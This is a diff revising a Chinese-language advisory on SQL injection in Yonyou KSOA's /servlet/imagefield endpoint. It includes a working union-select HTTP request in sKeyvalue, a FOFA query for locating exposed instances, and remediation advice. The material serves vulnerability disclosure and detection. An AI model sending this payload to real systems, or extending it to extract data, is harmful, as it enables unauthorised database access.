@@ -1,40 +1,38 @@
 ---
+source: "https://github.com/zan8in/afrog-pocs/blob/253291be2d307a6c836d5997bbb838f1e846f9ba/vulnerability/yonyou-ksoa-servletimagefield-skeyvalue-sqli.yaml"
+version: "具体受影响版本范围未披露"
 fofa: "app=\"用友-时空KSOA\""
-source: "OA-EXPTOOL/Lucifer1993 + afrog-pocs/zan8in"
 ---
 
 # 用友 时空KSOA servletimagefield sKeyvalue SQL注入漏洞
 
-# 漏洞描述
+## 漏洞描述
 
-用友时空 KSOA /servlet/imagefield 接口 sKeyvalue 参数存在 SQL 注入漏洞。攻击者可通过联合注入直接回显提取数据库内容，如管理员表字段数据。
+用友时空 KSOA 的 `/servlet/imagefield` 接口通过 `sKeyvalue` 等参数组织查询。公开 PoC 在 `sKeyvalue` 中使用联合查询回显固定字符串的 MD5，用于识别 SQL 注入；数据库数据的可访问范围仍取决于应用账户权限。
 
-# 影响版本
+## 影响范围
 
-用友时空 KSOA
+具体受影响版本范围未披露。本文按公开 PoC 所列产品记录，不据此扩展为全版本受影响。
 
-# **漏洞状态**
+## 公开验证方法
 
-| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
-|------|-------|-------|------|
-| 是 | 已公开 | 未公开 | 未知 |
-
-# 漏洞复现
-
-FOFA：app="用友-时空KSOA"
-
-POC/EXP：
-
-```
+```http
 GET /servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','test'))--+ HTTP/1.1
-Host: {{Hostname}}
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
-Accept-Encoding: gzip, deflate
-Connection: close
+Host: example.invalid
 ```
 
-通过 sTablename/sKeyname/sKeyvalue 三个参数指定任意表、字段与条件，利用 union 联合注入将查询结果（如 md5 值）直接回显在响应中，可逐字段拖取管理员账号密码等敏感数据。
+原始 afrog 模板检查 200 状态码及响应中的 `0x098f6bc`。人工核对应确认该值来自查询结果而非请求反射或错误页；完整 MD5 为 `098f6bcd4621d373cade4e832627b4f6`。此请求只计算常量，不需要读取真实用户数据。本文仅核对公开源码，未进行本地复现。
 
-# 漏洞修复
+## 修复建议
 
-联系用友官方获取安全补丁，对 sKeyvalue 等外部输入参数使用预编译语句并做严格过滤。
+向用友获取适用于当前版本的安全更新。修复时在对应数据库查询处使用参数化语句，并以最小权限数据库账户运行；修复后复核同一参数的正常请求与异常输入。
+
+## 参考链接
+
+- [zan8in/afrog-pocs 原始 PoC（固定提交）](https://github.com/zan8in/afrog-pocs/blob/253291be2d307a6c836d5997bbb838f1e846f9ba/vulnerability/yonyou-ksoa-servletimagefield-skeyvalue-sqli.yaml)
+
+## 网络测绘
+
+```text
+app="用友-时空KSOA"
+```
